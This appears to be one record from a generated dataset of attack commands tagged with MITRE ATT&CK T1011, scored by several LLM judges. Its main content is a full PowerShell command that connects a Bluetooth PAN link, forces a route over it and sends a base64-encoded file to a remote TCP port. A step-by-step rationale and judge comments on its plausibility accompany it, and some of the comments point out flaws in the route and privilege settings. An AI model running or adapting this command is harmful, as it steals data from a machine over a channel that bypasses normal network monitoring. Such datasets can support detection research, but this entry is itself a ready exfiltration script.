command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $ad=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1); netsh interface ip set address name="$($ad.Name)" static 10.241.56.2 255.255.255.252 | Out-Null; route add 10.241.56.1 mask 255.255.255.255 10.241.56.2 if $($ad.ifIndex) metric 5 | Out-Null; $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\ProgramData\misc.bin')); $c=New-Object Net.Sockets.TcpClient; $c.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.241.56.2'),0)); $c.Connect('10.241.56.1',54107); $s=$c.GetStream(); $x=[Text.Encoding]::UTF8.GetBytes($b); $s.Write($x,0,$x.Length); $s.Close(); $c.Close()
explanation: Pins a host route to the Bluetooth interface to prevent crossover, then exfiltrates base64 data over a custom TCP port via the Bluetooth PAN (T1011).
rationale_steps: Connect Bluetooth NAP to use a different medium.
Set a static address on the Bluetooth adapter using netsh.
Add a host route bound to the Bluetooth interface index to force path selection.
Bind TCP socket to the Bluetooth IP and transmit base64 payload to a high port.

llm_judgments.syntactic_justification: The PowerShell command is well-formed with balanced quotes/parentheses, valid separators, and correct variable expansions.
llm_judgments.semantic_justification: It aligns with exfiltration over Bluetooth PAN in concept, but relies on likely non-admin-invokable IP/route changes, a questionable BluetoothCL /connect usage, and an incorrect gateway in the route command, reducing operational plausibility.

llm_judgments.syntactic_justification: The PowerShell command is well-formed with balanced parentheses, proper semicolon separators, valid .NET method calls, correct string interpolation, and no syntax errors throughout the pipeline.
llm_judgments.semantic_justification: The command precisely implements T1011 by connecting a Bluetooth PAN adapter, assigning a static IP, pinning a host route to force traffic over the Bluetooth interface, reading and base64-encoding a file, then exfiltrating it via a TCP socket explicitly bound to the Bluetooth interface address — fully consistent with exfiltration over an alternate network medium.

llm_judgments.syntactic_justification: The command uses valid PowerShell syntax, correctly handles object properties, and properly sequences operations with semicolons.
llm_judgments.semantic_justification: The logic perfectly implements exfiltration over Bluetooth PAN, though the command requires administrative privileges to modify networking settings which contradicts the 'None' privilege metadata.
